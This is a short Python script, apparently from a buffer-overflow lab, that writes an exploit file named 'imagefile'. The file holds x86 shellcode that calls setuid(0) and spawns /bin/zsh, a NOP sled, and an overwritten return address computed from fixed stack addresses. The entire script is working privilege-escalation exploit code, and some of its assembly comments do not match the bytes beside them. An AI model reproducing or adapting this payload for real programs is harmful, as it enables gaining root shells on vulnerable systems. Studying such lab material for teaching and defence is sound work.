#!/usr/bin/python3
import sys

shellcode= (
    "\x31\xc0"
    "\x31\xdb"
    "\xb0\xd5"
    "\xcd\x80"
    "\x31\xc0"  
    "\x31\xc0"             # xorl    %eax,%eax
    "\x50"                 # pushl   %eax
    "\x68""/zsh"           # pushl   $0x68732f2f
    "\x68""/bin"           # pushl   $0x6e69622f
    "\x89\xe3"             # movl    %esp,%ebx
    "\x50"                 # pushl   %eax
    "\x53"                 # pushl   %ebx
    "\x89\xe1"             # movl    %esp,%ecx
    "\x99"                 # cdq
    "\xb0\x0b"             # movb    $0x0b,%al
    "\xcd\x80"             # int     $0x80
).encode('latin-1')

IMAGE_SIZE = 256
NOP = 0x90

# Fill the content with NOPs
content = bytearray(NOP for i in range(IMAGE_SIZE))      

# Put the shellcode at the end
start = IMAGE_SIZE - len(shellcode)
content[start:] = shellcode                       


EBP = 0xbfffeb38
MEM_START =  0xbfffeb19
offset = (EBP - MEM_START) + 4                                
retaddress = MEM_START + offset + 100

content[offset:offset+4]  = (retaddress).to_bytes(4,byteorder='little')  

# Write the content to a file
with open('imagefile', 'wb') as f:
  f.write(content)

